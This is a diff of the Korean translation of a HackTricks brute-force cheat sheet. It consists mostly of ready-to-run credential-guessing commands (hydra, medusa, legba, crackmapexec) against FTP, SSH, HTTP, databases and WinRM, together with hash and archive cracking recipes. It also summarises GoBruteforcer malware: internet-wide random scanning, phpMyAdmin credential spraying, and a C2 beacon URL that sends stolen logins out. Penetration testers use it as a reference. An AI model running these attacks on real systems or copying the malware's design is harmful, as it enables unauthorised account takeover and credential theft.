@@ -1,10 +1,8 @@
 # Brute Force - CheatSheet
 
-{{#include ../banners/hacktricks-training.md}}
-
 ## 기본 자격 증명
 
-사용 중인 기술의 기본 자격 증명을 **Google에서 검색**하거나, **다음 링크를 시도**하세요:
+사용 중인 technology의 기본 자격 증명을 **Google에서 검색**하거나 **다음 링크를 시도**하세요:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +17,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **직접 Dictionary 만들기**
+## **자체 Dictionaries 생성**
 
-대상에 대한 정보를 최대한 많이 수집하고 맞춤형 Dictionary를 생성하세요. 다음과 같은 도구가 도움이 될 수 있습니다:
+대상에 대한 정보를 최대한 많이 수집하고 custom dictionary를 생성하세요. 다음 Tools가 도움이 될 수 있습니다:
 
 ### Crunch
 ```bash
@@ -34,7 +32,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### 웹사이트 기반 wordlists
+### 웹사이트 기반 워드리스트
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -53,7 +51,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-단어 목록 생성 도구로, 단어 집합을 입력하면 제공된 단어에서 여러 변형을 만들어 특정 대상에 사용할 고유하고 이상적인 단어 목록을 생성할 수 있습니다.
+단어 목록 생성 도구로, 단어 집합을 입력하면 제공된 단어에서 여러 변형을 만들어 특정 대상에 사용할 고유하고 적합한 wordlist를 생성할 수 있습니다.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -87,17 +85,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Internet-wide bruteforcer workflow (Go-based scanners에서 얻은 교훈)
+## 인터넷 전반의 bruteforcer workflow (Go 기반 scanner에서 얻은 교훈)
 
-- **architecture에 맞게 조정된 worker pool**을 유지한다(예: `x86_64/arm64`에서는 약 95개의 goroutine, `i686`에서는 약 85개, 저사양 ARM에서는 약 50개). **고정된 동시성**을 유지하기 위해 1초마다 worker를 다시 생성하며, 각 worker는 종료되기 전에 정확히 하나의 target IP를 처리한다.<sup>[[1]](#references)</sup>
-- **random public IPv4**를 생성하되, honeypot이 많거나 라우팅할 수 없는 범위는 제외한다: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud 사용량이 많은 `/8`(`3/15/16/56`), DoD와 연관된 `/8`(`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **cleartext login**을 시도하기 전에 짧은 timeout(약 2초)으로 **service port**를 probe한다(FTP/21, MySQL/3306, Postgres/5432, HTTP/80을 통한 phpMyAdmin). 원격 dictionary/C2 fetch가 실패하면 **작은 builtin credential list**를 사용한다.
-- `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`와 같은 작은 HTTP GET beacon을 통해 적중 결과를 **exfiltrate**한다(service code 예: `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`). 탐지를 피하기 위해 공통 browser User-Agent를 재사용한다.
-- **phpMyAdmin spray**는 `GET /index.php?lang=en`을 사용해 가능성 높은 경로 수십 개(약 80개 이상)를 brute-force할 수 있다. PMA marker(`pmahomme` theme/`phpmyadmin.css`/`navigation.php`)를 탐지하고 `codemirror.css?v=X.Y.Z`를 파싱해 auth 방식을 분기한다: 버전이 `<4.9`이면 GET parameter `pma_username`/`pma_password`를 허용하고, 버전이 `>=4.9`이면 `server=1`, CSRF `token` 및 동일한 credential을 포함한 POST가 필요하다.
+다음 동작은 GoBruteforcer malware의 scanning workflow에서 관찰된 것이며, 정확한 값은 sample에 따라 다릅니다.<sup>[[1]](#references)</sup>
 
-## Services
+- **architecture에 맞게 조정된 worker pool**을 유지합니다(예: `x86_64/arm64`에서는 동시 worker 95개, `i686`에서는 85개, `armv5tel`에서는 35개, 그 외 architecture에서는 기본값 50개). 활성 worker를 매초 확인하고 target보다 적으면 replacement를 생성합니다. 각 worker는 종료하기 전에 최대 하나의 target IP만 처리합니다.
+- **random public IPv4**를 생성하되, 명백히 라우팅할 수 없거나 operator가 제외하는 특정 range를 제거합니다: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud가 많이 사용하는 `/8`(`3/15/16/56`), DoD와 관련된 `/8`(`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- 짧은 timeout(~2초)으로 **service port를 probe**한 후 **cleartext login**(FTP/21, MySQL/3306, Postgres/5432, HTTP/80을 통한 phpMyAdmin)을 시도합니다. C2 credential fetch가 실패하면 **작은 builtin credential list**로 fallback합니다.
+- `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`와 같은 작은 HTTP GET beacon을 통해 **hit를 exfiltrate**합니다(service code 예: `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`). 일반적인 browser User-Agent를 재사용하여 정상 traffic에 섞이게 합니다.
+- **phpMyAdmin spray**는 `GET /index.php?lang=en`을 사용하여 가능성이 높은 약 80개의 path에 brute-force를 수행할 수 있습니다. PMA marker(`pmahomme` theme/`phpmyadmin.css`/`navigation.php`)를 탐지하고 `codemirror.css?v=X.Y.Z`를 parse하여 auth 방식을 분기합니다: `<4.9` 버전은 GET param `pma_username`/`pma_password`를 허용하고, `>=4.9` 버전은 `server=1`, CSRF `token`, 동일한 credential을 사용한 POST를 사용합니다.
 
-Service name의 알파벳순으로 정렬되어 있다.
+## 서비스
+
+서비스 이름의 알파벳순으로 정렬되어 있습니다.
 
 ### AFP
 ```bash
@@ -113,7 +113,7 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM 및 Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
@@ -149,11 +149,11 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP 일반 Brute
+### HTTP Generic Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTP Basic 인증
+### HTTP Basic Auth
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
@@ -170,7 +170,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-http**s**의 경우 "http-post-form"을 "**https-post-form"**으로 변경해야 합니다.
+http**s**의 경우 "http-post-form"을 "**https-post-form"으로 변경해야 합니다.
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla 또는 (D)rupal 또는 (M)oodle
 ```bash
@@ -196,9 +196,6 @@ nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/va
 ```bash
 #hashcat
 hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
-
-#https://github.com/Sjord/jwtcrack
-python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
 
 #John
 john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
@@ -292,11 +289,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**patator**에서 **oracle_login**을 사용하려면 다음을 **설치**해야 합니다:
+**patator**에서 **oracle_login**을 사용하려면 다음을 **install**해야 합니다:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[오프라인 OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 및 **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**버전 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** 및 **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -418,13 +415,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### 취약한 SSH keys / Debian 예측 가능한 PRNG
+#### Weak SSH keys / Debian predictable PRNG
 
-일부 시스템에는 암호화 자료 생성에 사용되는 random seed와 관련된 알려진 결함이 있습니다. 이로 인해 keyspace가 크게 줄어들 수 있으며, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구를 사용해 bruteforce할 수 있습니다. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 미리 생성된 weak keys 세트도 제공됩니다.
+일부 시스템에는 cryptographic material을 생성하는 데 사용되는 random seed에 알려진 결함이 있습니다. 이로 인해 keyspace가 크게 줄어들 수 있으며, [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구를 사용해 brute force할 수 있습니다. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 사전 생성된 weak keys 세트도 제공됩니다.
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP text protocol은 RabbitMQ, ActiveMQ, HornetQ, OpenMQ와 같은 **인기 있는 message queueing services와 원활한 통신 및 상호작용을 지원하는** 널리 사용되는 messaging protocol입니다. 이는 메시지를 교환하고 다양한 messaging operations를 수행하기 위한 표준화되고 효율적인 방식을 제공합니다.
+STOMP text protocol은 RabbitMQ, ActiveMQ, HornetQ, OpenMQ와 같은 널리 사용되는 message queueing services와 **원활한 communication 및 interaction을 가능하게 하는** 널리 사용되는 messaging protocol입니다. 이는 messages를 교환하고 다양한 messaging operations를 수행하기 위한 standardized and efficient approach를 제공합니다.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -464,21 +461,21 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## 로컬
 
-### 온라인 cracking 데이터베이스
+### Online cracking 데이터베이스
 
-- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 및 SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (ESS/SSP 유무와 관계없이, 모든 challenge 값에 대한 MSCHAPv2/PPTP-VPN/NetNTLMv1)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (해시, WPA2 캡처 및 MSOffice, ZIP, PDF 등의 아카이브)
-- [https://crackstation.net/](https://crackstation.net) (해시)
+- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (해시 및 파일 해시)
-- [https://hashes.org/search.php](https://hashes.org/search.php) (해시)
-- [https://www.cmd5.org/](https://www.cmd5.org) (해시)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
+- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-해시를 brute force하기 전에 확인하세요.
+Hash를 brute force하기 전에 확인해 보세요.
 
 ### ZIP
 ```bash
@@ -498,7 +495,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-암호화된 zip 내부에 포함된 파일의 **plaintext**(또는 plaintext 일부)를 알아야 합니다. 암호화된 zip 내부에 포함된 **파일 이름과 크기**는 다음 명령으로 확인할 수 있습니다: **`7z l encrypted.zip`**\
+암호화된 zip 내부에 포함된 파일의 **plaintext**(또는 plaintext 일부)를 알아야 합니다. 다음 명령을 실행하여 암호화된 zip 내부에 포함된 **파일 이름과 크기**를 확인할 수 있습니다: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 releases 페이지에서 다운로드합니다.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -567,9 +564,9 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Luks 이미지
+### LUKS image
 
-#### 방법 1
+#### Method 1
 
 설치: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -578,7 +575,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-#### Method 2
+#### 방법 2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -587,7 +584,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-또 다른 Luks BF tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+또 다른 Luks BF 튜토리얼: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -595,7 +592,7 @@ mount /dev/mapper/mylucksopen /mnt
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG Private key
+### PGP/GPG 개인 키
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -606,14 +603,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 실행하세요.
+[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 사용하세요.
 
 ### Open Office Pwd Protected Column
 
 비밀번호로 보호된 열이 있는 xlsx 파일이 있다면 보호를 해제할 수 있습니다.
 
-- **google drive에 업로드하면** 비밀번호가 자동으로 제거됩니다.
-- **수동으로** **제거하려면**:
+- **Google Drive에 업로드**하면 비밀번호가 자동으로 제거됩니다.
+- **수동으로** **제거**하려면:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -629,31 +626,31 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-## Tools
+## 도구
 
-**Hash examples:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Hash 예시:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
 ### Hash-identifier
 ```bash
 hash-identifier
 > <HASH>
 ```
-### Wordlists
+### 워드리스트
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Wordlist 생성 도구**
+### **워드리스트 생성 도구**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 구성 가능한 기본 문자, keymap 및 경로를 지원하는 고급 keyboard-walk 생성기.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 구성 가능한 기본 문자, 키맵 및 경로를 지원하는 고급 keyboard-walk 생성기입니다.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-_**/etc/john/john.conf**_을 읽고 구성합니다.
+_**/etc/john/john.conf**_을 읽고 설정합니다.
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
@@ -662,16 +659,16 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat 공격
 
-- 규칙을 사용하는 **Wordlist 공격** (`-a 0`)
+- **Wordlist 공격** (`-a 0`) with rules
 
-**Hashcat**에는 이미 **규칙이 포함된 폴더**가 함께 제공되지만, [**여기에서 다른 흥미로운 규칙을 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat**에는 이미 **rules가 포함된 폴더**가 있지만, [**여기에서 다른 유용한 rules를 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator** 공격
+- **Wordlist combinator** attack
 
 hashcat을 사용하면 **2개의 wordlist를 1개로 결합**할 수 있습니다.\
-첫 번째 list에 **"hello"**라는 단어가 있고 두 번째 list에 **"world"**와 **"earth"**라는 단어가 각각 한 줄씩 있다면, `helloworld`와 `helloearth`가 생성됩니다.
+목록 1에 **"hello"**라는 단어가 포함되어 있고, 두 번째 목록에 **"world"**와 **"earth"**라는 단어가 각각 한 줄씩 포함되어 있다고 가정해 보겠습니다. `helloworld`와 `helloearth`라는 단어가 생성됩니다.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -726,7 +723,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Linux Hashes Cracking - /etc/shadow 파일
+Linux Hash 크래킹 - /etc/shadow 파일
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
@@ -748,8 +745,7 @@ Windows Hash 크래킹
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
-## 참고 자료
+## References
 
-- [1] [GoBruteforcer 내부 분석: AI로 생성된 서버 기본 설정, 취약한 비밀번호 및 암호화폐 중심 캠페인](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
-
+- [1] [GoBruteforcer 분석: AI가 생성한 서버 기본값, 취약한 비밀번호 및 암호화폐 중심 캠페인](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 {{#include ../banners/hacktricks-training.md}}
